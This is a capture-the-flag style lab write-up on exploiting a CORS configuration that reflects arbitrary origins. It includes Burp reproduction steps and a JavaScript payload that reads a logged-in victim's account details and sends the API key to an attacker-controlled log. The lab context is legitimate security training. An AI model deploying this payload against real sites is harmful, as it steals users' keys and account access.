# CORS vulnerability with basic origin reflection

## Description

The Academy website for [this lab](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack) has an insecure CORS configuration in that it trusts all origins. 

## Reproduction and proof of concept

1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.

![CORS](/_static/images/cors1.png)

2. Review the **HTTPhistory** in Burp: The key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.

3. Send the request to **Burp Repeater**, and resubmit it with the added header:

```text
Origin: https://whatever.com
```

![CORS](/_static/images/cors3.png)

The origin is reflected in the `Access-Control-Allow-Origin` header, meaning the application allows an arbitrary (public) origin, and `Access-Control-Allow-Credentials` is also true.

4. Create exploit (replacing `lab-id`):

```text
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://lab-id.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

5. Paste the exploit in the `body` field of the form in the exploit server.
6. Click **View exploit** and check you land on the log page and your API key is in the URL. 
7. **Deliver exploit to victim**.
8. Go to **Access log**

```

9. Copy the administrator's API key, and enter it as solution to the lab.

## Exploitability

An attacker would only have to create an exploit from a well-know template and convince the administrator into visiting the page with the exploit, potentially giving the attacker access to the administrator's account and all associated privileges and resources.

## Impact

The attacker could disable account notifications, enable 2FA to lock them out, and transfer data to an arbitrary address.

## Remediation

An attacker can directly forge a request from any trusted origin. Apply protections to sensitive data, such as authentication and session management, in addition to configuring CORS.
